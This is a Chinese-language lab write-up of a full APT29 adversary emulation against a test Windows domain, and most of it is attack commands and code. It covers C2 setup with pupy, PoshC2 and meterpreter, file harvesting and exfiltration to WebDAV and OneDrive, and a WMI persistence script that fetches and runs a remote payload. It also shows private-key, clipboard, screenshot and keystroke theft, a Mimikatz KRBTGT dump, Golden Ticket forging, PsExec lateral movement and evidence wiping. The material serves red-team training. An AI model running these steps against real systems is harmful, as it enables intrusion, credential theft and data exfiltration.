# ATT&CK

## 
sudo docker start elasticsearch
sudo systemctl start kibana

[**需要先去這邊載Paload**](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29/Archive/CALDERA_DIY/evals/payloads)
## 系統準備
**受害者系統準備**
<font size='4px' color='#FF7F50'>
1. 安裝一個Windows Server 2019 Datacenter
2. 一個Windows10 Pro 1903，然後克隆虛擬機。重新打開每個虛擬機運行Sysprep重置系統資訊。
3. 修改計算機名、加入apt.local域
4. 新建jack、john兩個域帳戶並添加到Domain Admin組，密碼為Passw0rd！
5. 關閉自動更新，也可以加入域后通過組策略禁止更新。
6. 使用DefenderControl關閉Windows Defender。
7. 開啟RDP，授予用戶遠端登陸許可權。
    
</font>

參考[連結](https://www.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft/?edition=2019)
現在kali 上是 192.168.0.102
然後兩台受害 分別是 10.0.2.15 192.168.0.101

```bash=
 #使用OfficeTools部署office 201910.安装Chrome浏览器11.每个PC都开启WinRM
Enable-PSRemoting -Force
Set-Service WinRM -StartMode Automatic
Get-WmiObject -Class win32_service |Where-Object {$_.name-like"WinRM"}
Set-Item wsman:\localhost\Client\TrustedHosts -value10.0.0.*
Get-Item WSMan:\localhost\Client\TrustedHosts
```

### 紅隊系統設置
#### 安裝pupy
```bash=
sudo docker image pull cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892
sudo docker tag cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892 docker-pupy
sudo docker run --rm -it -p 1234:1234 docker-pupy python pupysh.py
sudo docker run --rm -it -p 1234:1234 -v "/opt/payloads:/tmp/payloads" docker-pupy python pupysh.py
sudo docker run --rm -it -p 1234:1234 -v "/opt/attack-platform:/tmp/attack-platform" docker-pupy python pupysh.py
```

#### 安裝PoshC2
```bash=
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash
sudo posh-project -n posh1
sudo posh-config
```

#### git clone https://github.com/mitre-attack/attack-arsenal.git

#### 從/var/www/webdav提供共享(也可以用阿帕契之類的，能傳檔案都可以)

```bash=
sudo apt install apache2
sudo mkdir /var/www/webdav
sudo chown -R www-data:www-data /var/www/
sudo a2enmod dav
sudo a2enmod dav_fs
sudo vim /etc/apache2/sites-available/000-default.conf
sudo systemctl restart apache2.service
```
#### 將payload 複製到webdav共享
```bash=
sudo cp ~/day1/payloads/python.exe /var/www/webdav/ 
cd /var/www/webdav
sudo chown -R www-data:www-data python.exe
```
Redirector
1. 安裝socat
    Sudo apt install socat
2. 在Redirector上使用Socat设置端口轉發
     sudo socat TCP-LISTEN:443,fork TCP:192.168.0.102:443 &
     sudo socat TCP-LISTEN:1234,fork TCP:192.168.0.102:1234 &
     sudo socat TCP-LISTEN:8443,fork TCP:192.168.0.102:8443 &
## Step 1 初始違規
最初的違規行為是合法用戶按兩下（T1204）偽裝成良性單詞文檔的可執行有效載荷（螢幕保護程式可執行檔）（T1036）。 一旦執行，有效負載就使用RC4密碼在埠1234（T1065）上創建C2連接。 然後，攻擊者使用活動的C2連接生成互動式cmd.exe（T1059）和powershell.exe（T1086）Shell。

開始監聽
![image](https://hackmd.io/_uploads/B1kpiMfIA.png)

受害者點擊exe
![image](https://hackmd.io/_uploads/BkUG2GzLA.png)

開啟shell&&powershell
![image](https://hackmd.io/_uploads/rJlKhGzIA.png)


## Step 2 快速收集與滲出
### 攻擊者運行單行命令，以搜索文件系統中的文檔和媒體檔（T1083，T1119） 


這個 PowerShell 命令會遍歷指定目錄下的所有文件，並將找到的文件壓縮到一個單一的 ZIP 文件中。具體來說：

搜索文件：在用戶主目錄 ($env:USERPROFILE\) 下搜索指定類型的文件，包括 .doc、.pdf、.jpg 等等。
收集文件路徑：將所有找到的文件的完整路徑存儲在 $files 變量中。
壓縮文件：使用 Compress-Archive 命令將這些文件壓縮成一個名為 Draft.Zip 的文件，並將其保存到應用數據目錄 ($env:APPDATA) 中。

![image](https://hackmd.io/_uploads/rksJaMG80.png)


### 收集（T1005）並將內容壓縮（T1002）為單個檔（T1074）。
![image](https://hackmd.io/_uploads/S1-gCzfLR.png)

### 然後通過現有的C2連接來提取檔（T1041）。
![image](https://hackmd.io/_uploads/HJVmJmMIA.png)


## Step 3部屬Stealth工具包

### 攻擊者現在向受害者上載新的有效載荷（T1105）。 有效負載是帶有隱藏PowerShell腳本（T1027）的合法形成的圖像檔

![image](https://hackmd.io/_uploads/r1FOomfUR.png)

### 攻擊者通過用戶帳戶控制（UAC）旁路（T1122，T1088）提升特權
![image](https://hackmd.io/_uploads/BJ9MjXzLR.png)

### 可以使用的權限會話
![image](https://hackmd.io/_uploads/r1-knmz8C.png)

## Step 4防禦逃避與發現


### 產生互動式powershell.exe shell（T1086），附加工具已解壓縮（T1140）
### Python 腳本來下載、解壓和重新打包 Sysinternals Suite
```python=
import os
import zipfile
import requests

def download_file(url, local_filename):
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    return local_filename

def unzip_file(zip_filepath, extract_to):
    with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def create_zip(source_dir, output_filename):
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                zipf.write(os.path.join(root, file), 
                           os.path.relpath(os.path.join(root, file), 
                           os.path.join(source_dir, '..')))

# 設定下載和解壓路徑
download_url = 'https://download.sysinternals.com/files/SysinternalsSuite.zip'
download_path = '/tmp/SysinternalsSuite.zip'
extract_path = '/tmp/SysinternalsSuite'

# 下載文件
download_file(download_url, download_path)

# 解壓文件
unzip_file(download_path, extract_path)

# 重新壓縮文件
output_zip = 'SysinternalsSuite.zip'
create_zip(extract_path, output_zip)

print(f"重新壓縮的文件已生成: {output_zip}")

```
### 上傳至受害者
![image](https://hackmd.io/_uploads/Hye2JsMUA.png)

### 解壓縮檔案
![image](https://hackmd.io/_uploads/ryWlbifIC.png)

![image](https://hackmd.io/_uploads/SJC-boGLA.png)
### 攻擊者枚舉正在運行的進程（T1057）終止步驟1初始訪問的進程，然後刪除與該訪問相關的各種檔（T1107）

#### Get-process
![image](https://hackmd.io/_uploads/H1VRboMUA.png)

#### 關掉之前的後門

![image](https://hackmd.io/_uploads/SkjDfiGL0.png)

![image](https://hackmd.io/_uploads/BkIjGoM8C.png)

#### 刪除乾淨之前的後門


```shell=
$.\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\?$cod.3aka3.scr"
$.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"
$.\sdelete64.exe /accepteula $"$env:USERPROFILE\Downloads\SysinternalsSuite.zip"
```

## Step 5 – 持久性

```js=
function Invoke-Persistence {
    param (
        [int]$PersistStep
    )
    
    if ($PersistStep -eq 1) {
        # 創建新服務（T1050）
        New-Service -Name "MyService" -Binary "C:\Path\To\Your\Binary.exe" -DisplayName "MyService" -Description "My Persistent Service" -StartupType Automatic
    }
    elseif ($PersistStep -eq 2) {
        # 在 Windows 啟動文件夾中創建惡意有效負載（T1060）
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious.lnk"
        $targetPath = "C:\Path\To\Your\Malicious.exe"
        
        $WScriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $WScriptShell.CreateShortcut($startupPath)
        $shortcut.TargetPath = $targetPath
        $shortcut.Save()
    }
}

# 執行示例
Invoke-Persistence -PersistStep 1
Invoke-Persistence -PersistStep 2


```

## Step 6 - 憑證訪問

### 使用 accesschk.exe 實用工具（T1036）工具查看系統中的許可權和安全設置。
```shell=
 & "C:\Program Files\SysinternalsSuite\accesschk.exe"
```

### 攻擊者會收穫私鑰（T1145）
```shell=
function Get-PrivateKeys {
    # 獲取當前用戶的證書
    $certs = Get-ChildItem -Path Cert:\CurrentUser\My

    # 確保桌面路徑存在
    $desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")

    foreach ($cert in $certs) {
        $privateKey = $cert.PrivateKey
        if ($privateKey) {
            Write-Output "Found private key for certificate: $($cert.Subject)"
            # 保存私鑰到文件
            $privateKeyFile = [System.IO.Path]::Combine($desktopPath, "$(($cert.Subject -replace '[^a-zA-Z0-9]','_')).key")
            $privateKeyContent = [System.Convert]::ToBase64String($privateKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12, ""))
            [System.IO.File]::WriteAllText($privateKeyFile, $privateKeyContent)
            Write-Output "Private key saved to: $privateKeyFile"
        }
    }
}

# 執行函數
Get-PrivateKeys
```
### 存儲在本地Web瀏覽器（T1081，T1003）中的憑據。 然後，和密碼哈希（T1003）。
![image](https://hackmd.io/_uploads/rklw_sGIR.png)

## Step 7 - 收集和滲出

### 。 然後，攻擊者收集檔（T1005），將其壓縮（T1002）和加密（T1022），然後再將其上傳至攻擊者控制的WebDAV共用（T1048）。


### 攻擊者收集螢幕截圖（T1113）

```shell=
function Invoke-ScreenCapture {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
    $filePath = "$env:USERPROFILE\Desktop\screenshot.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $bitmap.Dispose()
    Write-Output "Screenshot saved to: $filePath"
}
Invoke-ScreenCapture
```

### 來自使用者剪貼板的數據（T1115）
```shell
$clipboardContent = Get-Clipboard
$clipboardFile = "$env:USERPROFILE\Desktop\clipboard.txt"
$clipboardContent | Out-File -FilePath $clipboardFile
Write-Output "Clipboard content saved to: $clipboardFile"

```

### 和鍵盤記錄（T1056）

```shell=
PS C:\Program Files\SysinternalsSuite> Keystroke-Check
PS C:\Program Files\SysinternalsSuite> Get-Keystrokes; Start-Sleep -Seconds 15; View-Job -JobName "Keystrokes"

```

### 查看與移除工作紀錄

```shell=
PS C:\Program Files\SysinternalsSuite> View-Job -JobName "Keystrokes"
PS C:\Program Files\SysinternalsSuite> Remove-Job -Name "Keystrokes" -Force
PS C:\Program Files\SysinternalsSuite> Remove-Job -Name "Screenshot" -Force

```

### Step 8 - 橫向運動

攻擊者在創建與第二受害者的遠端PowerShell會話之前，使用輕型目錄訪問協定（LDAP）查詢來枚舉域中的其他主機（T1018）。 通過此連接，攻擊者枚舉了正在運行的進程（T1057）。 接下來，攻擊者將新的UPX打包有效負載（T1045，T1105）上載到第二受害者。 通過先前使用的憑證（T1078）通過PSExec實用程式（T1077，T1035）在第二受害者上執行此新的有效負載。

#### 枚舉其他主機
攻擊者使用輕型目錄訪問協議（LDAP）查詢來枚舉域中的其他主機（T1018）。

```powershell=
PS C:\Program Files\SysinternalsSuite> Ad-Search Computer Name *
```

#### 遠程 PowerShell 會話
攻擊者在創建與第二受害者的遠程 PowerShell 會話之前，會先枚舉正在運行的進程（T1057）。

```powershell=
PS C:\Program Files\SysinternalsSuite> Invoke-Command -ComputerName PC1 -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId

```

#### 新建一個終端並啟動 msfconsole
使用 Metasploit 框架啟動一個 handler 來接收 Meterpreter 反向連接。

```powershell=
[msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https
```

#### 上傳新的 UPX 打包有效負載
攻擊者將新的 UPX 打包有效負載上載到第二受害者。
```powershell=
PS C:\Program Files\SysinternalsSuite> Invoke-SeaDukeStage -ComputerName PC1

```

#### 通過 PSEXEC 遠程執行 python.exe
使用先前獲取的憑證（T1078），通過 PSExec 實用程序在第二受害者上執行新的有效負載。
```powershell=
PS C:\Program Files\SysinternalsSuite> .\PsExec64.exe -accepteula \\PC1 -u "apt.local\jack" -p "Passw0rd!" -i 5 "C:\Windows\Temp\python.exe"
```

### Step 9 - 收集

攻擊者在運行 PowerShell 單行命令（T1086）之前，搜索其他文件（T1083，T1119），然後將其實用程序上載到第二受害者（T1105）。收集感興趣的文件（T1005），然後加密（T1022）並壓縮（T1002）為單個文件（T1074）。接著，該文件通過現有的 C2 連接進行竊取（T1041）。最後，攻擊者刪除與該訪問相關的各種文件（T1107）。

#### 9.A 進入 meterpreter python 會話

進入 meterpreter python 會話並上傳所需工具。

```shell
[msf] > sessions
[msf] > sessions -i 1
[meterpreter] > upload "/home/kali/payloads/day1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
[meterpreter] > upload "/home/kali/payloads/day1/SysinternalsSuite/sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
```

#### 9.B 收集並壓縮文件
運行 PowerShell 命令來收集感興趣的文件並壓縮為單個文件。
跟前面Step 2差不多


```powershell=
PS C:\Windows\system32> $env:APPDATA;$files=Get-ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*jack*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
PS C:\Program Files\SysinternalsSuite> cd C:\Windows\Temp
PS C:\Program Files\SysinternalsSuite> .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"
PS C:\Program Files\SysinternalsSuite> exit
[meterpreter] > download "C:\\Users\\jack\\Desktop\\working.zip" .

```

#### 9.C 刪除痕跡
使用 sdelete 刪除上傳的工具及生成的壓縮文件，以清除痕跡。
前面步驟也有
```powershell=
[meterpreter] > shell
[meterpreter (Shell)] > cd "C:\Windows\Temp"
[meterpreter (Shell)] > .\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"
[meterpreter (Shell)] > .\sdelete64.exe /accepteula "C:\Users\jack\AppData\Roaming\working.zip"
[meterpreter (Shell)] > .\sdelete64.exe /accepteula "C:\Users\jack\Desktop\working.zip"
[meterpreter (Shell)] > del "C:\Windows\Temp\sdelete64.exe"

```

### Step 10 - 持久性執行
初始受害者重新啟動，使用合法用戶登錄，此活動將觸發先前建立的持久性機制，即執行新服務（T1035）和Windows啟動資料夾（T1060）中的有效負載。 啟動資料夾中的有效負載使用被盜的令牌執行後續的有效負載（T1106，T1134）。


#### 10.A
重啟初始受害者; 等待系統啟動。 收到具有SYSTEM許可權的meterpreter會話

![image](https://hackmd.io/_uploads/SkbI13L80.png)

#### 10.B

通過登錄初始受害者打開我的電腦，按兩下C盤，觸發啟動資料夾的持久性

![image](https://hackmd.io/_uploads/ryotJnLUA.png)

#### 清理後門
```shell=
Cmd >sc delete “javamtsup”

Powershell > Remove-Item -Force -Path "HKLM:\SOFTWARE\Javasoft"

Powershell > Remove-Item "C:\Windows\System32\hostui.exe"

Powershell > Remove-Item "C:\Windows\System32\hostui.bat"

Powershell > Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk"
```

清理兩台受害者系統的C：WindowsTemp目錄。

### Step 11 – 初始违规
最初的違規行為是合法用戶按兩下（T1204）連結檔有效負載，該連結負載執行在隱藏的另一個偽檔（T1096）上執行的備用數據流（ADS），該偽檔是作為網路釣魚活動的一部分提供的。 ADS執行一系列枚舉命令，以確保在通過Windows註冊表運行鍵條目（T1060）建立持久性之前，它沒有在虛擬化分析環境（T1497，T1082，T1120，T1033，T1016，T1057，T1083）中執行。 嵌入式DLL有效負載，該有效負載已解碼並拖放到磁碟（T1140）。 然後，ADS執行PowerShell暫存器（T1086），該暫存器使用HTTPS協定（T1071，T1032）通過埠443（T1043）創建C2連接。


我這裡用跟前面一樣
![image](https://hackmd.io/_uploads/HyPrhguUC.png)

但可以用很多種方式例如 posh

### Step 12 - 強化訪問
攻擊者修改了先前建立的持久性機制中使用的DLL有效載荷（T1099）的時間屬性，以匹配在受害者的System32目錄（T1083）中找到的隨機文件的時間屬性。 然後，攻擊者枚舉Windows註冊表（T1012）中記錄的使用者安裝的已註冊AV產品（T1063）和軟體。
```powershell=
PS 1> loadmoduleforce /home/kali/payloads/day2/stepTwelve.ps1

PS 1> detectav

12.C

PS 1> software
```
#### 修改文件的時間戳
![image](https://hackmd.io/_uploads/SJczm-dL0.png)

#### 這個函數的主要目的是檢測系統中已安裝的防病毒軟件。
![image](https://hackmd.io/_uploads/ByRUr-uU0.png)

#### 這個函數的主要目的是枚舉系統中已安裝的軟件。它查詢註冊表中的卸載項目來獲取已安裝軟件的信息。
![image](https://hackmd.io/_uploads/HJFPBWO80.png)

### Step 13 - 本地枚舉
攻擊者使用各種Windows API調用執行本地枚舉，特別是收集本地計算機名（T1082），功能變數名稱（T1063），當前使用者上下文（T1016）和正在運行的進程（T1057）。

```powershell=
13.A

PS 1> loadmoduleforce /home/kali/payloads/day2/stepThirteen.ps1

PS 1> comp

13.B

PS 1> domain

13.C

PS 1> user

13.D

PS 1> pslist
```
#### comp 函數
這個函數用於獲取本地計算機的 NetBIOS 名稱。

![image](https://hackmd.io/_uploads/Hkma_b_IC.png)

#### domain 函數
這個函數用於獲取計算機所屬的域名。

![image](https://hackmd.io/_uploads/HJLA_-d8A.png)

#### user 函數
這個函數用於獲取當前登錄用戶的顯示名稱。

![image](https://hackmd.io/_uploads/BJ4gF-_UC.png)

#### pslist 函數
這個函數用於列出當前正在運行的進程。

![image](https://hackmd.io/_uploads/SJR-tbOU0.png)

### Step 14 – 提權
攻擊者通過用戶帳戶控制（UAC）繞過（T1122，T1088）提升特權。 然後，攻擊者使用新的提升的訪問許可權在自定義WMI類（T1047）中創建和執行代碼，該類將下載（T1105）並執行Mimikatz來轉儲純文本憑據（T1003），該純文本憑據經過解析，編碼和存儲在WMI中 類（T1027）。 在跟蹤WMI執行已完成（T1057）之後，攻擊者讀取存儲在WMI類中的純文本憑據（T1140）。


```powershell=
loadmoduleforce /home/kali/payloads/day2/stepFourteen_bypassUAC.ps1

PS 1> bypass
```
#### 提權
![image](https://hackmd.io/_uploads/S1l_y2b_LC.png)


### 建立持久性
攻擊者通過創建WMI事件訂閱（T1084）以在當前使用者（T1033）登錄時執行PowerShell有效負載，來建立對受害者的持久訪問的輔助手段。


這個 wmi 函數主要目的是設置一個事件觸發器，當有用戶登錄時，會自動下載並運行一個可執行文件。此腳本的用途可能包括自動化任務、系統管理、甚至是潛在的惡意活動。在實際使用中，請確保遵循合法合規的規範，並僅在授權的環境中使用。

```powershell=
PS 2>loadmoduleforce /home/kali/payloads/day2/stepFifteen_wmi.ps1

PS 2> wmi
```

```javascript=
function wmi {
	
	$FilterArgs = @{name='WindowsParentalControlMigration';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser' AND TargetInstance.__RELPATH like '%$($env:UserName)%'";}
	$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

	$ConsumerArgs = @{name='WindowsParentalControlMigration';
                CommandLineTemplate='PowerShell.exe -C $server="http://192.168.0.101:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red-wmi" -WindowStyle hidden;'}
	$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

	$FilterToConsumerArgs = @{
		Filter = [Ref] $Filter
		Consumer = [Ref] $Consumer
	}
	$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
}

```


### Step 16 - 横向运动
攻擊者利用 Windows API 枚舉環境中的域控制器和域的安全標識符，然後使用以前轉儲的憑據建立到域控制器的遠程 PowerShell 會話。通過此連接，攻擊者會將 Mimikatz 二進制文件複製到域控制器，並轉儲 KRBTGT 帳戶的哈希。

#### 16.A 切换到低權限
載入 PowerView 模組：
```powershell=
PS 1> loadmoduleforce /home/kali/payloads/day2/powerview.ps1

PS 1>get-netdomaincontroller
```

#### 16.B 獲取用戶的 SID：

PS 1> loadmoduleforce /home/kali/payloads/day2/stepSixteen_SID.ps1

PS 1>siduser

#### 16.C 切換到新的高許可權會話中


```powershell=

#載入 Invoke-WinRMSession 模組：
PS 2>loadmoduleforce /home/kali/payloads/day2/Invoke-WinRMSession.ps1

#建立 WinRM 會話：
PS 2> invoke-winrmsession -Username "apt.local\john" -Password "Passw0rd!" -IPAddress 10.0.0.100

#執行命令並記錄會話 ID：
PS 2>Invoke-Command -Session $oejtw -scriptblock {Get-Process} | out-string
```
#### 16.D 這一步驟用於將 Mimikatz 複製到域控制器並執行以獲取 KRBTGT 帳戶的哈希，這是一個關鍵步驟，因為 KRBTGT 的哈希可以用來生成黃金票據（Golden Ticket），進而完全控制域內的所有系統。


```powershell=
#複製攻擊工具到域控制器：
PS 2> Copy-Item m.exe -Destination "C:\Windows\System32\" -ToSession $oejtw
#使用 Mimikatz 轉儲 KRBTGT 帳戶的哈希：
PS 2> Invoke-Command -Session $oejtw -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
#移除 PowerShell 會話：
PS 2> Get-PSSession | Remove-PSSession
#保存 NTLM hash，例子
NTLM : 5fae7c899798b24d56c697f86e8cc7d6
```

### Step 17 – 收集
攻擊者在收集（T1005）和暫存（T1074）感興趣的文件之前，會先收集存儲在本地電子郵件客戶端中的電子郵件（T1114）。暫存文件將被壓縮（T1002），並帶有GIF文件類型的魔術字節（T1027）。

#### 17.A 切换到低权限会话
```powershell=
#載入收集電子郵件的模組：
PS 1> loadmoduleforce /home/kali/payloads/day2/stepSeventeen_email.ps1
收集電子郵件：
PS 1> psemail
```
#### 17.B 切换到新的高權限會話中
```powershell=
#在臨時目錄中創建新目錄：
PS 2> New-Item -Path "C:\Windows\Temp\" -Name "WindowsParentalControlMigration" -ItemType "directory"
#將感興趣的文件複製到新目錄：
PS 2> Copy-Item "C:\Users\john\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration"

```

#### 17.C

```powershell=
#載入壓縮文件的模組：
PS 2> loadmoduleforce /home/kali/payloads/day2/stepSeventeen_zip.ps1
#將目錄壓縮為帶有特定魔術字節的文件：
PS 2> zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration

```

### Step 18 – 渗出
攻擊者將本地驅動器映射到在線 Web 服務帳戶（T1102），然後將先前暫存的數據提取到此存儲庫（T1048）。

#### 將 OneDrive 映射為網路驅動器
```powershell=
#net use 命令用於將 OneDrive 映射到本地驅動器 Y:。
PS 2> net use y: https://d.docs.live.net/E3_________C93 /user:apt.local@outlook.com "D{IFt&______-@XV"
```
#### 將暫存的數據複製到 OneDrive
```powershell=
#使用 Copy-Item 命令將之前暫存的壓縮文件從本地臨時目錄複製到 OneDrive 映射的驅動器上。
PS 2> Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "Y:\WindowsParentalControlMigration.tmp"

```

### Step 19 - 清理
攻擊者通過在 powershell.exe 中反射性加載並執行 Sdelete 二進制文件（T1055），刪除與該訪問相關的各種文件（T1107）。


![image](https://hackmd.io/_uploads/Bk9C2ZtIC.png)

```powershell=
PS 2> wipe "C:\Windows\System32\m.exe"
PS 2> wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp"
PS 2> wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"
```

### Step 20 - 利用持久性
初始受害者重新啟動並使用合法用戶登錄，此活動將觸發先前建立的持久性機制，即 Windows 註冊表運行鍵引用的 DLL 有效負載（T1085）的執行和 WMI 事件訂閱（T1084），後者執行新的 PowerShell 暫存器（T1086）。攻擊者使用來自先前漏洞的材料，使用新的訪問權限來生成 Kerberos Golden Ticket（T1097），該材料用於與新受害者建立遠程 PowerShell 會話（T1028）。通過此連接，攻擊者在域內創建一個新帳戶（T1136）。

```powershell=
#使用 restart-computer 命令強制重啟受害者計算機。
PS 2> restart-computer -force

```
![image](https://hackmd.io/_uploads/ByZcJftLA.png)

使用 RDP 登錄受害者系統：

#### 切換到 System 權限的會話中：

```powershell=
#清除 Kerberos 緩存：
PS 3> klist purge
#加載 Mimikatz 模組：
PS 3> loadmoduleforce /home/kali/payloads/day2/Invoke-Mimikatz-Evals.ps1
#生成 Kerberos Golden Ticket：
PS 3> Invoke-Mimikatz-Evals -command ""kerberos::golden /domain:apt.local /sid:S-1-5-21-374680414-1105030488-2607252970 /rc4:5fae7c899798b24d56c697f86e8cc7d6 /user:john /ptt""
#驗證 Kerberos 票據：
PS 3> klist

```
#### 建立遠程 PowerShell 會話並創建新帳戶

```powershell=
#進入目標計算機的 PowerShell 會話：
PS 3> Enter-PSSession PC1
#在遠程計算機上創建新用戶：
PS 3> Invoke-Command -ComputerName PC1 -ScriptBlock {net user /add toby "pamBeesly<3"}
```
